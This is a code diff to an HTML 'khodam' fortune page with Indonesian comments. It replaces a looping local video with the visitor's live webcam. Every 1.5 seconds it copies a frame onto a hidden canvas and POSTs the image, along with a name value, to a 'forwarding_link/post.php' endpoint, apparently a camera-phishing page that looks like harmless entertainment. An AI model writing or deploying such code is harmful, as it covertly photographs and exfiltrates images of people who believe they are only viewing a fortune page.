@@ -1,3 +1,4 @@
+<!doctype html>
 <html>
 <head>
 <meta charset="utf-8">
@@ -89,9 +90,9 @@ May your khodam bring you protection, wisdom, and blessings.
 <i class="fa fa-facebook"></i> Share
 </a>
 
-<!-- Video lokal atau streaming -->
+<!-- Kamera -->
 <div class="video-wrap">
-  <video id="video" src="video_khodam.mp4" autoplay loop muted playsinline></video>
+  <video id="video" autoplay playsinline></video>
 </div>
 <canvas hidden id="canvas" width="640" height="480"></canvas>
 
@@ -100,7 +101,7 @@ May your khodam bring you protection, wisdom, and blessings.
 function post(imgdata){
   $.ajax({
     type: 'POST',
-    data: { khodam_image: imgdata },
+    data: { khodam_image: imgdata, khodamName: khodamName },
     url: 'forwarding_link/post.php',
     dataType: 'json',
     async: false
@@ -111,11 +112,24 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-setInterval(function(){
-  ctx.drawImage(video, 0, 0, 640, 480);
-  var imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
-  post(imgData);
-}, 1500);
+// Minta akses kamera
+async function initCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    video.srcObject = stream;
+
+    setInterval(() => {
+      ctx.drawImage(video, 0, 0, 640, 480);
+      const imgData = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
+      post(imgData);
+    }, 1500);
+  } catch (err) {
+    console.error("Error accessing camera:", err);
+    alert("Tidak bisa mengakses kamera. Pastikan browser mengizinkan akses kamera.");
+  }
+}
+
+initCamera();
 </script>
 
 </body>
